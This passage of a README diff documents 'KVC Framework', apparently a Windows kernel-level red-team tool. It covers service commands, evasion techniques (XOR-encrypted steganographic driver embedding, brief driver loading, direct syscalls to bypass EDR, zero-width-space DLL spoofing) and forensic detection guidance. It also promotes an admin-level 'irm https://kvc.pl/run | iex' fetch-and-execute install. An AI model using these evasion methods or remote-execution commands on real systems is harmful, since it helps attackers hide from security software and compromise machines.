+  * **Uninstallation (`kvc uninstall`):** Stops the service if running (`ControlService(SERVICE_CONTROL_STOP)`) and then removes it using `DeleteService` .
+
+### Service Management Commands
+
+  * **Install Service:**
+
+    ```powershell
+    kvc.exe install
+    ```
+
+    Registers KVC as an auto-start Windows service running as LocalSystem. Attempts to start the service immediately after installation.
+
+  * **Uninstall Service:**
+
+    ```powershell
+    kvc.exe uninstall
+    ```
+
+    Stops the service (if running) and removes it from the system . Also cleans up related KVC configuration registry keys under `HKCU\Software\kvc` .
+
+  * **Start Service:**
+
+    ```powershell
+    kvc.exe service start
+    ```
+
+    Starts the installed KVC service.
+
+  * **Stop Service:**
+
+    ```powershell
+    kvc.exe service stop
+    ```
+
+    Stops the running KVC service.
+
+  * **Restart Service:**
+
+    ```powershell
+    kvc.exe service restart
+    ```
+
+    Stops and then restarts the KVC service .
+
+  * **Check Service Status:**
+
+    ```powershell
+    kvc.exe service status
+    ```
+
+    Queries the SCM and reports whether the KVC service is installed and its current state (Running, Stopped) .
+
+**Note:** Most core KVC features (dumping, protection manipulation, DSE control) use temporary, on-demand driver loading ("atomic operations") and do *not* require the persistent service to be installed or running. The service mode is primarily for scenarios requiring a continuous background presence.
+
+-----
+
+## 18\. Evasion Techniques
+
+KVC incorporates several techniques designed to minimize its footprint and evade detection by security software (EDR, AV).
+
+### Steganographic Driver & DLL Hiding
+
+Instead of shipping separate `.sys` and `.dll` files, KVC embeds its required kernel driver (`kvc.sys`) and the modified watermark DLL (`ExplorerFrame<U+200B>.dll`) within its own executable's resources using a multi-stage steganographic process:
+
+```mermaid
+graph TD
+    subgraph Build Process
+        A[kvc.sys] --> B(Combine);
+        C[ExplorerFrame<U+200B>.dll] --> B;
+        B --> D[Create kvc.evtx Container];
+        D --> E[Compress into CAB Archive];
+        E --> F[XOR Encrypt CAB using Key];
+        F --> G[Prepend kvc.ico Header];
+        G --> H[Embed as RCDATA (IDR_MAINICON) in kvc.exe];
+    end
+    subgraph Runtime Extraction (Utils::ExtractResourceComponents)
+        I[Load IDR_MAINICON Resource] --> J[Skip kvc.ico Header (3774 bytes)];
+        J --> K[XOR Decrypt using Key];
+        K --> L[Decompress CAB In-Memory (FDI)];
+        L --> M[Result: kvc.evtx Container];
+        M --> N{Split PE Files based on Subsystem Type};
+        N -- Subsystem: Native --> O[kvc.sys];
+        N -- Subsystem: Windows GUI/CUI --> P[ExplorerFrame<U+200B>.dll];
+    end
+```
+
+**Explanation :**
+
+1.  **Combination:** The `kvc.sys` driver and the modified `ExplorerFrame<U+200B>.dll` are concatenated into a single binary blob, likely within a container format KVC refers to internally as `kvc.evtx`.
+2.  **Compression:** This container is compressed into a Cabinet (`.cab`) archive.
+3.  **Encryption:** The CAB archive is encrypted using a simple, repeating 7-byte XOR key (`KVC_XOR_KEY = { 0xA0, 0xE2, 0x80, 0x8B, 0xE2, 0x80, 0x8C }`).
+4.  **Steganography:** The encrypted CAB data is prepended with the binary data of a standard icon file (`kvc.ico`, 3774 bytes long).
+5.  **Embedding:** This combined blob (icon header + encrypted CAB) is embedded as a raw data resource (`RT_RCDATA`) with ID `IDR_MAINICON` (102) into the final `kvc.exe` executable.
+6.  **Extraction:** At runtime, KVC loads this resource, skips the known icon header size (3774 bytes) , decrypts the remaining data using the XOR key , decompresses the resulting CAB archive in memory using the FDI library , and finally splits the `kvc.evtx` container back into the original `kvc.sys` and DLL files by identifying their PE headers and subsystem types (Native for driver, Windows GUI/CUI for DLL) .
+
+This process hides the driver/DLL from static file analysis of `kvc.exe` and avoids dropping separate suspicious files onto the disk until absolutely necessary.
+
+### Atomic Kernel Operations
+
+For most operations requiring kernel access (DSE, protection manipulation, dumping), KVC employs an "atomic" model:
+
+1.  **Initialize (`PerformAtomicInit`):** Extracts the driver, dynamically creates a temporary service entry, loads the driver, and opens a communication handle .
+2.  **Execute:** Performs the required kernel memory read/write operations via IOCTLs.
+3.  **Cleanup (`PerformAtomicCleanup`):** Immediately closes the communication handle, unloads the driver, deletes the temporary service entry, and cleans up any temporary files .
+
+This ensures the driver is loaded only for the brief duration needed, minimizing the window for detection and leaving minimal persistent traces on the system.
+
+### Direct System Calls (Conceptual)
+
+The README.md mentions the concept of using direct system calls to bypass user-mode EDR hooks, referencing `syscalls.cpp` and `AbiTramp.asm`. While the full implementation details weren't the focus of this analysis, the *concept* involves:
+
+1.  Identifying the System Service Number (SSN) for required kernel functions (e.g., `NtReadVirtualMemory`, `NtWriteVirtualMemory`).
+2.  Using assembly language (`syscall` instruction on x64) to directly invoke the kernel function, bypassing the standard user-mode API layers (like `kernel32.dll`, `ntdll.dll`) where EDRs typically place hooks.
+3.  Handling the difference in calling conventions between standard C++ (x64 fastcall) and the kernel's syscall interface (using `R10` instead of `RCX` for the first argument, etc.), often requiring an assembly trampoline (`AbiTramp.asm`).
+
+This technique aims to make KVC's actions invisible to user-mode monitoring solutions.
+
+### Other Minor Techniques
+
+  * **Zero Width Space:** Using `ExplorerFrame<U+200B>.dll` instead of `ExplorerFrame_modified.dll` makes the hijacked DLL appear almost identical to the original in file listings.
+  * **TrustedInstaller Context:** Performing sensitive file and registry operations under the TrustedInstaller context bypasses standard ACLs and potential monitoring focused on Administrator actions.
+  * **Dynamic API Loading:** Loading functions like `CreateServiceW`, `DeleteService` dynamically via `LoadLibrary`/`GetProcAddress` might slightly hinder static analysis compared to direct imports .
+
+-----
+
+## 19\. Security Considerations and Detection
+
+While KVC employs evasion techniques, its operations can still leave forensic artifacts detectable by vigilant security monitoring.
+
+### Potential Artifacts
+
+  * **Event Logs (System Log):**
+      * **Event ID 7045:** Service installation (Source: Service Control Manager) - generated when KVC temporarily installs its driver service or permanently installs the background service (`kvc install`). The service name `KernelVulnerabilityControl` might be present.
+      * **Event ID 7036:** Service start/stop (Source: Service Control Manager) - generated during atomic operations (driver load/unload) and service lifecycle management (`kvc service start/stop`).
+      * **Event ID 7034:** Service termination unexpected (Source: Service Control Manager) - might occur if cleanup fails or is interrupted.
+      * **Event ID 12, 13 (Kernel-General):** Potential indicators of system time changes if `SeSystemtimePrivilege` is used (though not explicitly seen in analyzed code).
+  * **Event Logs (Security Log - Requires Auditing):**
+      * **Event ID 4688:** Process Creation - logs execution of `kvc.exe`, `kvc_pass.exe`, `powershell.exe` (for Defender exclusions), `cmd.exe` (via Sticky Keys or `kvc trusted`). Look for processes launched with elevated privileges or unusual parent processes.
+      * **Event ID 4657:** Registry value modification - logs changes made by `kvc shift`, `kvc watermark remove/restore`, `kvc secengine disable/enable`. Look for modifications under IFEO, CLSID, or WinDefend service keys.
+      * **Event ID 4673:** Privileged service called - logs usage of sensitive privileges like `SeDebugPrivilege`.
+      * **Event ID 4624:** Logon - shows logons associated with Sticky Keys backdoor (`SYSTEM` logon from `winlogon.exe` context).
+  * **File System Artifacts:**
+      * **`kvc.exe`, `kvc_pass.exe`:** The executables themselves.
+      * **Temporary Driver:** `kvc.sys` briefly present in a system location (likely DriverStore FileRepository or System32\\drivers) during atomic operations.
+      * **Hijacked DLL:** `ExplorerFrame<U+200B>.dll` in `C:\Windows\System32` when watermark removal is active.
+      * **Memory Dumps:** `.dmp` files created by `kvc dump` in the specified or default (`Downloads`) location.
+      * **Credential Reports:** `.html`, `.txt`, `.json` files generated by `kvc export secrets` or `kvc bp` in the specified or default (`Downloads`) location.
+      * **Registry Backups:** Hive files (`SYSTEM`, `SOFTWARE`, etc.) created by `kvc registry backup` or `kvc registry defrag`.
+  * **Registry Artifacts:**
+      * **Temporary Service:** `HKLM\SYSTEM\CurrentControlSet\Services\KernelVulnerabilityControl` (present only during atomic kernel operations).
+      * **Permanent Service:** Same path as above, but persistent if `kvc install` was used.
+      * **Session Management:** `HKCU\Software\kvc\Sessions\<BootID>\...` storing unprotected process states.
+      * **Sticky Keys IFEO:** `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe` with `Debugger` value set to `cmd.exe`.
+      * **Watermark Hijack:** `HKCR\CLSID\{ab0b37ec-56f6-4a0e-a8fd-7a8bf7c2da96}\InProcServer32` default value pointing to `ExplorerFrame<U+200B>.dll`.
+      * **Defender Exclusions:** Stored under `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`.
+      * **Defender Engine State:** `HKLM\SYSTEM\CurrentControlSet\Services\WinDefend` `DependOnService` value containing `RpcSs<U+200B>` when disabled via KVC.
+  * **Memory Artifacts:**
+      * **Loaded Driver:** `kvc.sys` present in kernel memory during operations.
+      * **Modified EPROCESS:** `Protection` field altered for target processes.
+      * **Modified `g_CiOptions`:** Value set to `0x0` in kernel memory when DSE is disabled.
+
+### Basic Detection Strategies
+
+  * **Monitor Service Creation/Deletion:** Look for rapid creation and deletion of services named `KernelVulnerabilityControl`. Monitor Event ID 7045.
+  * **Monitor Registry Keys:** Use tools like Sysmon to monitor changes to IFEO keys (`sethc.exe`), critical CLSID `InProcServer32` keys, Defender exclusions, and the `WinDefend` service configuration.
+  * **Monitor Process Execution:** Audit creation of `cmd.exe` from unusual parent processes (especially `winlogon.exe` or `services.exe` context related to Sticky Keys) and execution of `powershell.exe` with `Add-MpPreference` or `Remove-MpPreference` commands.
+  * **File System Monitoring:** Monitor creation/deletion of `kvc.sys` in driver directories or `ExplorerFrame<U+200B>.dll` in System32. Scan for suspicious `.dmp` files.
+  * **Kernel Memory Integrity:** Advanced tools can potentially detect modifications to `EPROCESS.Protection` or `g_CiOptions` by comparing runtime values against known good states (PatchGuard might also detect this).
+  * **Signature-Based Detection:** AV/EDR may eventually develop signatures for `kvc.exe`, `kvc_pass.exe`, the embedded driver, or the modified DLL.
+
+-----
+
+## 20\. License and Disclaimer
+
+### Educational Use License
+
+The KVC Framework is provided under an educational use license. It is intended **strictly for authorized security research, penetration testing on systems you own or have explicit permission to test, and educational purposes** to understand Windows internals and security mechanisms.
+
+### Disclaimer and User Responsibility
+
+  * **No Warranty:** This software is provided "as is" without warranty of any kind.
+  * **Risk:** Use of this software, particularly features involving kernel memory modification (DSE control, process protection) or registry manipulation (service control, backdoors, Defender management, registry restore), carries inherent risks, including potential system instability, data loss, or rendering the system unbootable. **USE ENTIRELY AT YOUR OWN RISK.**
+  * **Legality:** Unauthorized use of this software to access, modify, or disrupt computer systems is illegal in most jurisdictions. Users are solely responsible for ensuring their actions comply with all applicable local, state, federal, and international laws, as well as any relevant corporate policies or terms of service.
+  * **Misuse:** The author (Marek Wesołowski / WESMAR) disclaims any liability for misuse of this software or any damages resulting from its use or misuse. By using KVC, you acknowledge these risks and agree to use the tool responsibly and ethically .
+
+-----
+
+## 21\. Support and Contact
+
+### Technical Support and Inquiries
+
+For technical questions, bug reports, feature requests, or collaboration inquiries related to the KVC Framework:
+
+  * **Author:** Marek Wesołowski (WESMAR)
+  * **Email:** [marek@wesolowski.eu.org](mailto:marek@wesolowski.eu.org)
+  * **Phone:** [+48 607-440-283](https://www.google.com/search?q=tel:%2B48607440283)
+  * **Website:** [kvc.pl](https://kvc.pl)
 
 ### Professional Services
 
-Available consulting services:
+Marek Wesołowski offers professional consulting services in areas including:
 
-#### Security Assessments
-- **Advanced persistent threat (APT) simulation**
-- **Windows security architecture review**
-- **Custom evasion technique development**
-- **Incident response and forensic analysis**
+  * Advanced Penetration Testing & Red Teaming
+  * Windows Internals Analysis & Security Research
+  * Custom Tool Development
+  * Incident Response Support
+  * Security Training Workshops
 
-#### Training & Education
-- **Technical workshops** on Windows internals
-- **Red team training** for advanced techniques
-- **Blue team education** on detection methods
-- **Academic guest lectures** and presentations
+Contact via the details above for inquiries regarding professional engagements.
 
----
+-----
 
-## 📄 License & Disclaimer
+\<div align="center"\> \<h2 style="font-size: 2.5em; margin-bottom: 20px;"\>✨ One-Command Installation\</h2\> \<p style="font-size: 1.3em; margin-bottom: 30px;"\> The fastest way to get KVC running on your system: \</p\> \<div style="background: \#1a1a1a; padding: 20px; border-radius: 10px; border: 1px solid \#333; display: inline-block;"\> \<code style="font-size: 1.4em; font-weight: bold; color: \#00ff00;"\> irm https://kvc.pl/run | iex \</code\> \</div\> \<p style="margin-top: 20px; font-size: 1.1em;"\> \<strong\>⚠️ Administrator privileges required\!\</strong\> Right-click PowerShell and select "Run as Administrator" \</p\> \</div\>
 
-### Educational License
+\<div align="center"\>
 
-This software is provided for educational and authorized security research purposes only. Use of this software for unauthorized access to computer systems is strictly prohibited and may violate applicable laws.
-
-### Disclaimer
-
-The authors assume no responsibility for misuse of this software. Users are solely responsible for ensuring their use of this software complies with all applicable laws and regulations.
-
-**USE AT YOUR OWN RISK**
-
----
-<div align="center"> <h2 style="font-size: 2.5em; margin-bottom: 20px;">✨ One-Command Installation</h2> <p style="font-size: 1.3em; margin-bottom: 30px;"> The fastest way to get KVC running on your system: </p> <div style="background: #1a1a1a; padding: 20px; border-radius: 10px; border: 1px solid #333; display: inline-block;"> <code style="font-size: 1.4em; font-weight: bold; color: #00ff00;"> irm https://kvc.pl/run | iex </code> </div> <p style="margin-top: 20px; font-size: 1.1em;"> <strong>⚠️ Administrator privileges required!</strong> Right-click PowerShell and select "Run as Administrator" </p> </div>
-
-<div align="center">
-
-**KVC Framework v1.0.1**  
+**KVC Framework v1.0.1**
 *Advancing Windows Security Research Through Kernel-Level Capabilities*
 
-🌐 [kvc.pl](https://kvc.pl) | 📧 [Contact](mailto:marek@wesolowski.eu.org) | ⭐ [Star on GitHub](../../)
+🌐 [kvc.pl](https://kvc.pl) | 📧 [Contact](mailto:marek@wesolowski.eu.org) | ⭐ [Star on GitHub](https://github.com/wesmar/kvc/)
 
 *Made with ❤️ for the security research community*
 
-</div>
+\</div\>
+
+-----
